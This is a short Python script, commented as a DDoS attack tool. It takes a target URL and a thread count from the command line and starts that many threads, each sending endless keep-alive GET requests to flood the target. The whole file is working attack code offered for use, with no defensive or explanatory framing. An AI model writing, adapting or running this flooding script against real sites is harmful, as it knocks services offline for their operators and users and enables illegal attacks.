import requests
import threading
import sys


#function that executes attack using infinite loop
def ddos_attack(url):
	while True:
		# making get requests to specified url from sys arguments
		# keepin connection alive after response in order to supplement
		# the attack
		requests.get(url, headers={'Connection': 'keep-alive'})


#looping through for the number of desired threads
for _ in range(int(sys.argv[2])):
	#create threads with target function executing attack
	threads = threading.Thread(target=ddos_attack, args=(sys.argv[1],))
	#start thread
	threads.start()
